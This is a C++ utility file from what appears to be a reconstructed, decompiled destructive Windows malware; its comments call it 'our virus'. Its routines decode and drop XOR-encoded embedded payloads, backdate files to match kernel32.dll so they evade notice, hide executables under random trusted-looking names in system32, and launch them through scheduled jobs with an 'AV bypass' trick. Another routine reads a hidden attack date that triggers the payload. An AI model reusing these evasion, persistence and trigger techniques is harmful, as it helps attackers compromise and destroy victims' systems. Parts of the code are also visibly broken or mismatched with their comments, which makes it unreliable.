/******************************************************************************************
    Copyright 2013 Christian Roggia

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
******************************************************************************************/
// Utils.cpp
// Misc. utility functions used globally

#include "Global.h"
#include "Utils.h"
#include <LMat.h>

// Actually useful functions are higher up, with functions whose names explain what they do
//  are lower



/*  WriteEncodedResource

    Writes data from an XOR-encoded resource to a specified file

    param lpFileName:   Name of file to write to
    param hModule:      Module to look for resource in
    param lpName:       Name of the resource to find
    param lpType:       Type of specified resource
    param key:          Array of characters comprising the encoding key
    param key_len:      Number of bytes in the key

    return:             False if operation fails, true otherwise
*/
bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len)
{
    char *v16; // [sp+18h] [bp-10h]@10

    HRSRC res = FindResourceW(hModule, lpName, lpType);
    if(!res)
        return false;

    HGLOBAL res_handle = LoadResource(hModule, res);
    if(!res_handle)
        return false;

    char *res_content = (char *)LockResource(res_handle);
    if(!res_content)
        return false;

    DWORD res_size = SizeofResource( hModule, res );
    if(!res_size)
        return false;

    PVOID oldValue = NULL;

    if((_Wow64DisableWow64FsRedirection(&oldValue)) == 0)
        return false;

    HANDLE hObject = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);

    if((_Wow64RevertWow64FsRedirection(oldValue)) == 0)
        return false;

    if(!hObject || hObject == INVALID_HANDLE_VALUE)
        return false;

    unsigned int i = 0;
    unsigned int NumberOfBytesWritten = 0;

    // Embedded loops, should be cleaned up further
    while(i < res_size)
    {
        char decoded_byte = res_content[i] ^ key[i % key_len];
        WriteFile(hObject, &decoded_byte, 1, &NumberOfBytesWritten, 0);
        ++i;

        if(i >= 1024)
        {
            if(i < res_size)
            {
                void *lpAddress = VirtualAlloc(NULL, res_size - i, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                char *newFile = (char *)lpAddress;
                if(newFile)
                {
                    v16 = &newFile[-i];

                    do
                    {
                        v16[i] = decoded_byte;
                        ++i;
                    }
                    while(i < res_size);

                    WriteFile(hObject, newFile, res_size - 1024, &NumberOfBytesWritten, 0);
                    VirtualFree(lpAddress, 0, MEM_RELEASE);
                }
            }
            break;
        }
    }

    CloseHandle(hObject);

    return true;
}

/*  SetSafeFileTime

    Sets the file creation, last modified, and last accessed times
     to be the same as those for kernel32.dll, essentially making
     them look to be a part of the initial Windows install.

    param lpFileName:   Name of the file to set the times for

    return: True upon success, false otherwise
*/
bool SetSafeFileTime(LPCWSTR lpFileName)
{
    if(!Globals.kernel_creation_time.dwLowDateTime) return false;
    if(!lpFileName) return false;

    PVOID oldValue = NULL;
    _Wow64DisableWow64FsRedirection(&oldValue);
    HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
    _Wow64RevertWow64FsRedirection(oldValue);

    if(file_handle == INVALID_HANDLE_VALUE) return false;

    if(SetFileTime(file_handle, &Globals.kernel_creation_time, &Globals.kernel_last_access_time, &Globals.kernel_last_write_time))
    {
        CloseHandle(file_handle);
        return true;
    }

    CloseHandle(file_handle);
    return false;
}

/*  StartServiceProcess

    Attempts to create a new service, and, failing that, just creates
     a new process.

    param svc_name:     Name of the desired service EG "TrkSrv.exe"
    param svc_path:     Full path to the service's executable
    param service_id:   Will be set to the process ID of the service,
                            if applicable

    return: True if any method succeeds, false if they fail
*/
bool StartServiceProcess(WCHAR *svc_name, const WCHAR *svc_path, DWORD *service_id)
{
    if(!svc_name || !svc_path || !service_id) return 0;

    WCHAR *svc_path_cpy = (WCHAR *)VirtualAlloc(NULL, 2 * strlenW(svc_path) + 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(svc_path_cpy)
    {
        memmove(svc_path_cpy, svc_path, 2 * strlenW(svc_path) + 2);
        *service_id = 0;

        // If adding a new job fails OR, 95 seconds later, the service is still running
        if(!AddNewJob(0, svc_path_cpy) || (Sleep(95000), *service_id = SearchProcessByIdOrName(0, svc_name) == 0))
        {
            struct _PROCESS_INFORMATION ProcessInformation;
            memset(&ProcessInformation, 0, 16);

            struct _STARTUPINFOW StartupInfo; // [sp+Ch] [bp-5Ch]@7
            memset(&StartupInfo, 0, 68);

            // Failsafe is just to create a process with our virus
            if(!CreateProcessW(NULL, svc_path_cpy, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &ProcessInformation))
            {
                VirtualFree(svc_path_cpy, 0, MEM_RELEASE);
                return false;
            }

            *service_id = ProcessInformation.dwProcessId;

            CloseHandle(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hProcess);
            CloseHandle(StartupInfo.hStdError);
            CloseHandle(StartupInfo.hStdInput);
            CloseHandle(StartupInfo.hStdOutput);
        }

        return true;
    }

    return false;
}

/*  AddNewJob

    Using some trickery around calling NetScheduleJobAdd, schedule
     the service to run 90 seconds from now.

    param UncServerName:    Server to add the job to
    param svc_path:         Absolute path to the service

    return: True upon success, False otherwise.
             It's likely worth noting that this will still return
             true if the thread to delete the job fails to get
             created
*/
typedef NET_API_STATUS (__stdcall *NetSchdJobAdd_t)(LPCWSTR, LPBYTE, LPDWORD);
bool AddNewJob(const WCHAR *UncServerName, WCHAR *svc_path)
{
    bool retVal = false; // [sp+Fh] [bp-2Dh]@1

    PTIME_OF_DAY_INFO time_of_day = NULL;
    if(!NetRemoteTOD(UncServerName, (LPBYTE *)&time_of_day))
    {
        AT_INFO *job_info = NULL;
        if(!NetApiBufferAllocate(sizeof(AT_INFO), (LPVOID *)&job_info))
        {
            if(job_info)
            {

                job_info->Command     = svc_path;
                job_info->JobTime     = 1000 * (60 * (time_of_day->tod_mins + 60 * time_of_day->tod_hours - time_of_day->tod_timezone) + time_of_day->tod_secs + 90);
                job_info->Flags       = JOB_NONINTERACTIVE;
                job_info->DaysOfMonth = 0;
                job_info->DaysOfWeek  = 0;

                /** ----->> AV bypass "NetScheduleJobAdd" <<----- */
                std::basic_string<char> str_procname = "JobAdd";
                str_procname.insert(0, "Schedule");
                str_procname.insert(0, "Net");

                NetSchdJobAdd_t _NetScheduleJobAdd = GetProcAddress(GetModuleHandleW(L"netapi32.dll"), str_procname.c_str());

                DWORD jobID = NULL;

                if(_NetScheduleJobAdd && !_NetScheduleJobAdd(UncServerName, (LPBYTE)job_info, &jobID))
                {
                    JOB_PROPERTIES *job = (JOB_PROPERTIES *)VirtualAlloc(NULL, 48, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if(job)
                    {
                        job->JobId = jobID;
                        if(UncServerName)
                        {
                            strcpyW(job->ServerName, UncServerName, 2 * strlenW(UncServerName) + 2);
                            job->IsServerNameSet = 1;
                        }
                        else
                        {
                            job->IsServerNameSet = 0;
                        }
                        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DeleteJobAfter95Seconds, job, 0, 0);
                    }
                    retVal = true;
                }
                else
                {
                    retVal = false;
                }

                if(job_info)
                    NetApiBufferFree(job_info);
            }
        }
    }

    if(time_of_day)
        NetApiBufferFree(time_of_day);

    return retVal;
}

int DeleteJobAfter95Seconds(JOB_PROPERTIES *lpAddress)
{
    if(lpAddress)
    {
        Sleep(95000);
        NetScheduleJobDel(lpAddress->IsServerNameSet ? (const WCHAR *)lpAddress : 0, lpAddress->JobId, lpAddress->JobId);
        VirtualFree(lpAddress, 0, MEM_RELEASE);
    }

    return 0;
}

/* DeleteRandExecutables

    By iterating through the table of possible names, delete any executables created with
    a randomly generated name.

    param: None

    return: None
*/
void DeleteRandExecutables()
{
    const WCHAR *exec_name; // [sp+20h] [bp-808h]@1
    WCHAR exec_path[1024]; // [sp+24h] [bp-804h]@2


    exec_name = Globals.random_exec_name[0];

    // I'm not a big fan of do-while loops instead of while loops
    //  so this will likely be restructured soon.
    do
    {
        strcpyW(exec_path, Globals.windows_directory, strlenW(Globals.windows_directory) * sizeof(WCHAR));
        strcpyW(&exec_path[strlenW(Globals.windows_directory)], L"\\system32\\", sizeof(WCHAR) * strlenW(L"\\system32\\"));
        strcpyW(&exec_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\")], exec_name, sizeof(WCHAR) * strlenW(exec_name));
        strcpyW(&exec_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\") + strlenW(exec_name)], L".exe", sizeof(WCHAR) * strlenW(L".exe"));

        exec_path[strlenW(exec_name) + strlenW(Globals.windows_directory) + strlenW(L"\\system32\\") + strlenW(L".exe")] = 0;
        DeleteFileW(exec_path);

        // Because of how Globals.random_exec_name is declared, this advances to next exec
        exec_name += 15;
    }
    while(exec_name < &exec_name[29]); // If we've reached the last pointer, end
}

/*  GetRandomServiceInfo

    Generate a random "trusted" executable name, and a path for said executable. Store
    those in the parameters supplied.

    param svc_name: Output; Will hold the name of the executable
    param svc_path: Output; Will hold %SYSTEM% + svc_name

    return: True if an unused filename is found, false otherwise
*/
bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
{
    // Only try 29 times
    //  Because this is random this is odd
    for( int i = 0; i < 29; i++ )
    {
        WCHAR *rnd_svc_name = Globals.random_exec_name[GetRandom() % 29];

        strcpyW(svc_name, rnd_svc_name, 2 * strlenW(rnd_svc_name));
        strcpyW(&svc_name[strlenW(rnd_svc_name)], L".exe", 2 * strlenW(L".exe"));
        svc_name[strlenW(rnd_svc_name) + strlenW(L".exe")] = 0;

        // This must be some anti-AV shit, it's done this way throughout the exec
        strcpyW(svc_path, Globals.windows_directory, 2 * strlenW(Globals.windows_directory));
        strcpyW(&svc_path[strlenW(Globals.windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
        strcpyW(&svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
        svc_path[strlenW(Globals.windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;

        PVOID oldValue = NULL;
        _Wow64DisableWow64FsRedirection(oldValue);
        HANDLE file_handle = CreateFileW(svc_path, GENERIC_READ, 7, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
        DWORD last_err = GetLastError();
        _Wow64RevertWow64FsRedirection(oldValue);

        // If the file doesn't exist, we've found our file name
        if( file_handle == INVALID_HANDLE_VALUE && last_err == ERROR_FILE_NOT_FOUND )
            return true;

        CloseHandle(file_handle);
    }

    return false;
}

// Attack timing functions


/* GetAttackDateFromFile

    Attempts to grab the attack date from \\inf\netft429.pnf.

    File format is YYMMDDHHMM.
    EG to attack on 20APR2016 at 1630, the file would be 1604201630

    param a1: Output parameter; is loaded with the attack time

    return: False if the parameter is a null pointer, or if any part of the file is not
            correctly formatted.
*/
bool GetAttackDateFromFile(WORD *a1)
{
    if(a1)
    {
        WCHAR FileName[256];
        char date_config[10];

        strcpyW(FileName, Globals.windows_directory, 2 * strlenW(Globals.windows_directory) + 2);
        strcpyW(&FileName[strlenW(Globals.windows_directory)], L"\\inf\\netft429.pnf", 2 * strlenW(L"\\inf\\netft429.pnf") + 2);

        HANDLE in_file = CreateFileW(FileName, 0x80000000u, 7, 0, 3, 0x100000, 0);

        if(in_file && in_file != INVALID_HANDLE_VALUE)
        {
            DWORD NumberOfBytesRead = 0;
            ReadFile(in_file, date_config, 10, &NumberOfBytesRead, 0);

            if(NumberOfBytesRead != 10)
                return false;

            // Minute
            if(atoi(&date_config[8]) > 59)
                return false;
            a1[ADA_MINUTE] = atoi(&date_config[8]);
            date_config[8] = 0;

            // Hour
            if(atoi(&date_config[6]) > 23)
                return false;
            a1[ADA_HOUR  ] = atoi(&date_config[6]);
            date_config[6] = 0;

            // Day
            if(atoi(&date_config[4]) > 30)
                return false;
            a1[ADA_DAY   ] = atoi(&date_config[4]);
            date_config[4] = 0;

            // Month
            if(atoi(&date_config[2]) > 11)
                return false;
            a1[ADA_MONTH ] = atoi(&date_config[2]);
            date_config[2] = 0;

            // Year
            if(atoi(&date_config[0]) > 98)
                return false;
            a1[ADA_YEAR  ] = atoi(&date_config[0]) + 2000;

            if(a1[3] > GetDaysInMonth(a1[0], a1[1]))
                return false;

            CloseHandle(in_file);
        }

        return true;
    }

    return false;
}

/*  TimeToAttack

    Figures out if the target time has already passed. If no file with attack time has
    been created, default to 15AUG2016 at 0808.

    param: None

    return: 0 if it is time to attack, the number of minutes until the attack if it's
            within the next hour, and 2 otherwise.
*/
int TimeToAttack()
{
    WORD v5[6]; // [sp+Ch] [bp-24h]@1
    struct _SYSTEMTIME SystemTime; // [sp+1Ch] [bp-14h]@4

    // Fallback attack time is 15 AUG 2012 @0808
    if(!GetAttackDateFromFile(v5))
    {
        v5[ADA_YEAR  ] = 2012;
        v5[ADA_MONTH ] = 8;
        v5[ADA_HOUR  ] = 8;
        v5[ADA_DAY   ] = 15;
        v5[ADA_MINUTE] = 8;
    }

    GetSystemTime(&SystemTime);
    if(SystemTime.wYear < v5[ADA_YEAR])
        return 2;

    if(SystemTime.wMonth >= v5[ADA_MONTH] && SystemTime.wDay >= v5[ADA_DAY] && SystemTime.wHour >= v5[ADA_HOUR] && SystemTime.wMinute >= v5[ADA_MINUTE])
        return 0;

    if(SystemTime.wYear == v5[ADA_YEAR] && SystemTime.wMonth == v5[ADA_MONTH] && SystemTime.wDay == v5[ADA_DAY] && SystemTime.wHour == v5[ADA_HOUR])
    {
        if(v5[ADA_MINUTE] - SystemTime.wMinute < 2)
        {
            if(v5[ADA_MINUTE] - SystemTime.wMinute < 0)
                return 0;

            return v5[ADA_MINUTE] - SystemTime.wMinute;
        }
    }

    return 2;
}

/* IsLeapYear

    Determines whether a provided year is a leap year

    param year: Year to test

    return:     True if the year is a leap year, false otherwise
*/
bool IsLeapYear(signed int year)
{
    bool v1; // zf@2

    if(year <= 0) // The fuck?
        return FALSE;

    v1 = (year & 0x80000003) == 0;

    if((year & 0x80000003) < 0)
        v1 = (((year & 0x80000003) - 1) | 0xFFFFFFFC) == -1;

    return (v1 && (year % 100 || !(year % 400))) ? TRUE : FALSE;
}

DWORD Globals.days_in_month[] =
{
    31, 28, 31, 30,
    31, 30, 31, 31,
    30, 31, 30, 31
};

/*  GetDaysInMonth

    Given a month and a year, determine the number of days in the month. Accounts for
    leap-years.

    param year:     Year month is in
    param month:    Integer representing month. 1=JAN, 2=FEB, etc.

    return:         Integer number of days in provided month
*/
int GetDaysInMonth(signed int year, unsigned int month)
{
    if((month - 1) > 11)
        return 0;

    int days = Globals.days_in_month[month];

    // February leap-year shit
    if(month == 2)
    {
        if(IsLeapYear(year))
            ++days;
    }

    return days;
}

// Has to be dynamically loaded so codes work on 32 AND 64 bit systems
// Lookup the function name on MSDN for full docs
typedef int (__stdcall *disableFSRedirection_t)(PVOID *);
int _Wow64DisableWow64FsRedirection(PVOID *OldValue)
{
    disableFSRedirection_t func = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "_Wow64DisableWow64FsRedirection");

    if( func )
    {
        return func( OldValue );
    }

    return 0;
}

typedef int (__stdcall *revertFSRedirection_t)(PVOID);
int _Wow64RevertWow64FsRedirection(PVOID OldValue)
{
    revertFSRedirection_t func = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "_Wow64RevertWow64FsRedirection");

    if( func )
    {
        return func( OldValue );
    }

    return 0;
}

// Below here are all pretty self-explanatory

bool Is64Bit()
{
    HKEY hKey;
    char *Data[100];
    WCHAR processor_architecture[52]; // [sp+74h] [bp-6Ch]@4

    if(RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_EXECUTE, &hKey))
        return false;

    if( RegQueryValueExW(hKey, L"PROCESSOR_ARCHITECTURE", 0, Data, &size) != ERROR_SUCCESS )
    {
        RegCloseKey(hKey); // Should we not close the key later, too?
        return false;
    }

    memmove(processor_architecture, sizeof(Data), size);
    processor_architecture[size / 2] = 0;

    if(wcscmp(L"AMD64", processor_architecture) && wcscmp(L"amd64", processor_architecture))
        return false;

    return true;
}

DWORD SearchProcessByIdOrName(DWORD dwPID, WCHAR *szProcessName)
{
    HANDLE hProcess; // eax@4

    if(!dwPID && !szProcessName)                    return 0;
    if((dwPID = GetProcessID(szProcessName)) == 0)  return 0;

    if((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID)) == 0) return 0;

    CloseHandle(hProcess);
    return dwPID;
}

WCHAR *strcpyW(WCHAR *a1, const WCHAR *a2, ...)
{
    va_list va;

    va_start(va, a2);
    if(!a1 || !a2) return 0;

    for(char * i = (char *)a1; *(int *)va; --*(int *)va)
    {
        *i = i[(char *)a2 - (char *)a1];
        ++i;
    }

    return a1;
}

// fill dst with specified number of chrs
char *strset(char *dst, char chr, int size)
{
    for( int i=1; i < size; i++ )
    {
        *(dst + i) = chr;
    }
    return dst;
}

UINT32 strlenW(const WCHAR *string)
{
    UINT32 i = 0; // eax@1

    if(string)
    {
        while((LOBYTE(string[i]) || HIBYTE(string[i])) && i < 2000000000)
            ++i;
    }

    return i;
}

/*  strcmpW

    Compares two unicode strings, and returns true if they are the same, and false if
    they are different. Fuck the standard, I guess.

    param a1:   First unicode string to compare
    param a2:   Second unicode string

    return: True if the strings match, false otherwise.
*/
bool strcmpW(WCHAR *a1, WCHAR *a2)
{
    WCHAR *v2; // eax@1
    bool v3; // zf@2
    WCHAR *v5; // ecx@5
    WCHAR v6; // dx@8
    WCHAR v7; // di@9

    v2 = a1;
    if(a1)
    {
        v5 = a2;
        if(!a2)
            return 0;
        while(*v2)
        {
            v6 = *v5;
            if(!*v5)
                break;
            v7 = *v2;
            ++v5;
            ++v2;
            if(v7 != v6)
                return 0;
        }
        if(*v2)
            return 0;
        v3 = *v5 == 0;
    }
    else
    {
        v3 = a2 == 0;
    }
    if(v3)
        return 1;
    return 0;
}

char *btowc(char *a1, WCHAR *a2, int a3)
{
    char *v3; // ebx@1
    char *v4; // esi@2
    int v5; // edi@3
    char *result; // eax@6

    v3 = a1;
    if(a1 && (v4 = (char *)a2) != 0)
    {
        v5 = a3;
        memset(a2, 0, 2 * a3);
        if(a3)
        {
            do
            {
                if(!*v3)
                    break;
                *v4 = *v3;
                v4 += 2;
                ++v3;
                --v5;
            }
            while(v5);
        }
        *(WCHAR *)v4 = 0;
        result = v4;
    }
    else
    {
        result = 0;
    }
    return result;
}

DWORD GetProcessID(WCHAR *process_name)
{
    HANDLE hSnapshot; // esi@1
    PROCESSENTRY32W pe; // [sp+8h] [bp-230h]@1

    pe.dwSize = 556;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32FirstW(hSnapshot, &pe);
    while(!strcmpW(process_name, pe.szExeFile))
    {
        if(!Process32NextW(hSnapshot, &pe))
        {
            CloseHandle(hSnapshot);
            return 0;
        }
    }
    CloseHandle(hSnapshot);

    return pe.th32ProcessID;
}

// I don't know why M$ made it this way, but MoveFileExW
//  is basically saying "Delete this file on restart"
bool ForceFileDeletion(LPCWSTR file_to_delete)
{
    if(!DeleteFileW(file_to_delete))
        MoveFileExW(file_to_delete, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    return 1;
}

// Worth noting this isn't actually random, like, at all, as it will always be a larger
// number than it was previously
DWORD GetRandom()
{
    DWORD dwTickCount = GetTickCount();

    // Return absolute value of difference between TickCount and the last random number
    return Globals.last_random_number = (dwTickCount < Globals.last_random_number) ? (Globals.last_random_number - dwTickCount) : (dwTickCount - Globals.last_random_number);
}